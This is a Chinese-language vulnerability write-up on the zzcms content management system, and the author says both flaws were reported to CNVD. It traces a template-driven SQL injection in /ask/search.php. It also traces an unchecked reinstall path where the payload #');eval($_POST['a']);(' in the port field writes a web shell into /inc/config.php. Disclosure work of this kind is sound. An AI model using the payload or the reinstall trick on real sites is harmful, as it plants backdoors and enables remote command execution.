前言
==

该cms算是发展了很多年的了,官网在这里:<http://www.zzcms.net/about/6.htm> 如果想要跟着复现可以自行下载,本次发现的漏洞均已提交CNVD。

sql注入
=====

漏洞点是在/ask/search.php的第9行:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8282ca3af7ddf8cd141ddcc8f18426c88848c13.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8282ca3af7ddf8cd141ddcc8f18426c88848c13.png)  
发现是对ask\_search.htm进行读取然后把数据存入$strout中。最后通过一系列过滤操作后会在232行执行showlabel函数:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6bfc040da31bc8daef2ee549875a94142110f700.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6bfc040da31bc8daef2ee549875a94142110f700.png)  
所以跟进:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f73d630364ecb3a464303f6469281ba19d077b7d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f73d630364ecb3a464303f6469281ba19d077b7d.png)  
这里$str函数是读取的ask\_search.htm内容,然后发现在14行中存在fixed函数,所以继续跟进:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0e1e6fbe1ea4d956d61eb4626fb56813e58efdcb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0e1e6fbe1ea4d956d61eb4626fb56813e58efdcb.png)  
发现存在showad函数,但是其中的$cs任然是通过前面的htm文件内容控制,然后继续跟进:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0fc79661ed846d334b078fed6499e0775ab82602.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0fc79661ed846d334b078fed6499e0775ab82602.png)  
发现对$cs进行分割,然后在660行进行sql的拼接,后面会再进行执行,因为是读取文件的内容,所以该cms对sql的过滤无效,但是由上图代码可知,htm的内容会以逗号分割,所以需要对逗号进行绕过。

漏洞验证
----

这里我用的数据库数据如下:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8bdb97917cf01aa2a913ea870c704990d91e37e6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8bdb97917cf01aa2a913ea870c704990d91e37e6.png)  
先在后台的模板处的网站模板中添加ask\_search.htm,然后添加如下:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd7fe482ff03f6525e7808975bf8464fe0a029c9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd7fe482ff03f6525e7808975bf8464fe0a029c9.png)  
然后直接访问/ask/search.php,因为数据库是zzcms,所以第一个为z时会延时:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c94d9acd054c7b0ea6011d353797e3f1105fd175.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c94d9acd054c7b0ea6011d353797e3f1105fd175.png)  
然后换成其它的,则不会延时  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-041d04bc2e081b64de4147a5a9c89d46ffb63ca5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-041d04bc2e081b64de4147a5a9c89d46ffb63ca5.png)

代码执行
====

漏洞点是在/install/index.php的第131行  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1f8e59ca8274ec32df9638e0fdf839105499dfa6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1f8e59ca8274ec32df9638e0fdf839105499dfa6.png)  
存在文件的写入。  
首先在/install/step\_2.php中,该cms没有做是否安装过该CMS的验证的,所以虽然存在install.lock但是却任然可以直接进行安装:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-06e2b1761836cfa2f664d0859fecf9bd7fcabfaa.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-06e2b1761836cfa2f664d0859fecf9bd7fcabfaa.jpg)  
所以我们直接POST传入step=2就可以直接开始进行重新安装的步骤,然后当step=4时,点击下一步后,就能进入step=5了,然后会发现页面会让写这些东西:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bdc3963b16c6f29cae2897bf864970e7d458e10.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bdc3963b16c6f29cae2897bf864970e7d458e10.png)  
然后根据第一张图我们知道,它会把这些填写的数据库信息写入/inc/config.php中,所以我们可以这么考虑,在端口3306后面使用url的锚点,来使数据库可以正常连接,但是却能让我们写入一句话木马。

漏洞验证
----

在端口3306后面输入#');eval($\_POST\['a'\]);('  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c10fd1dbf7c8450f93ade7be6b373bb564608555.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c10fd1dbf7c8450f93ade7be6b373bb564608555.png)  
然后就会写入在/inc/config.php中:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6b666fd3f23429958347256edbb11116d3e509c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6b666fd3f23429958347256edbb11116d3e509c4.png)  
所以直接访问执行命令:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d1d07e48a09ae6f7b4a781d4494b1f8415aba5a3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d1d07e48a09ae6f7b4a781d4494b1f8415aba5a3.png)